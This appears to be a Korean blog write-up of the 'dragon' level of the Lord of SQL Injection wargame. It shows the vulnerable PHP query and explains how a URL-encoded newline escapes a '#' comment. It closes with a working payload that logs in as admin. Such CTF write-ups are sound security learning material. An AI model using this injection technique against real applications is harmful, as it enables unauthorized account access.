---
title: LOS - 20번 dragon
category: Lord of SQL Injection
---

# [20] dragon

## 문제
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdVPRAK%2FbtrnP7hVFzh%2FQKtIyj2XkRhpCJhBS1Kuv1%2Fimg.png">

## 풀이
주어진 쿼리문을 보겠다.

```php
$query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
```

첫번째 조건절 뒤에 #을 넣어서 뒷부분을 날려버리고 있다.

<br>

스터디 초반에 로그인 로직 5가지 유형을 개발할 때, 조건절이 개행 처리된 쿼리에는 주석을 주입해도 원하는대로 처리되지 않음을 경험했었다.

이 점에 착안해서 개행 문자를 이용해주면 될 것 같다.

<br>

즉, 쿼리문을 다음과 같이 변조할 생각이다.


```php
$query = "select id from prob_dragon where id='guest'# and pw='
	    and pw='' or id='admin'";
```

<br>

위 쿼리문은 다음 쿼리문과 동일하게 동작한다.

```php
$query = "select id from prob_dragon where (id='guest' and pw='') or id='admin'";
```

따라서 정상적으로 admin 계정을 fetch 해오게 된다.

<br> 

개행 문자인 \n 은 url encoding을 거쳐 **%0a**로 입력해준다.

<br>

입력할 답은 다음과 같다.

```
%0a and pw='' or id='admin
```

## 결과
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcVwX0y%2FbtrnPk3bf4W%2FN4kYfakdGJ6KpZu0buH111%2Fimg.png">